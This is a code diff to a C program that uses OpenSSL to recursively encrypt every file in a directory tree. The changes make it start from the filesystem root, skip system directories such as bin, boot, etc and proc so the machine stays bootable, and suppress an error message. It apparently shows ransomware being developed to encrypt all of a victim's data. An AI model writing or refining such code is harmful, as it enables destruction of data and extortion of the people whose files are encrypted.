@@ -10,6 +10,7 @@
 #include <openssl/evp.h>
 #include <openssl/pem.h>
 #include <openssl/err.h>
+#include <sys/stat.h>
 
 #define KEY_SIZE 32
 #define BLOCK_SIZE 16
@@ -227,9 +228,19 @@ void enF(const char *filename, const unsigned char *key, const unsigned char *iv
 void enDire(const char *directory, const unsigned char *key, const unsigned char *iv)
 {
     DIR *dir = opendir(directory);
+    struct stat st;
+    char *repos[] = {"bin",
+                     "sbin",
+                     "boot",
+                     "etc",
+                     "lib",
+                     "dev",
+                     "proc",
+                     "sys",
+                     NULL};
+
     if (!dir)
     {
-        perror("!!");
         return;
     }
 
@@ -250,6 +261,19 @@ void enDire(const char *directory, const unsigned char *key, const unsigned char
             if (S_ISDIR(st.st_mode))
             {
                 // Se for diretório, chama recursivamente
+                int p = 0;
+                for (int i = 0; repos[i] != NULL; i++)
+                {
+                    if (strcmp(entry->d_name, repos[i]) == 0)
+                    {
+                        p = 1;
+                        break;
+                    }
+                }
+
+                if (p)
+                    continue;
+
                 enDire(filepath, key, iv);
             }
             else if (S_ISREG(st.st_mode))
@@ -268,6 +292,8 @@ void enDire(const char *directory, const unsigned char *key, const unsigned char
 
 int main()
 {
+    chdir("/");
+
     unsigned char key[KEY_SIZE];
     unsigned char iv[BLOCK_SIZE]; // initialization vector(random)
 
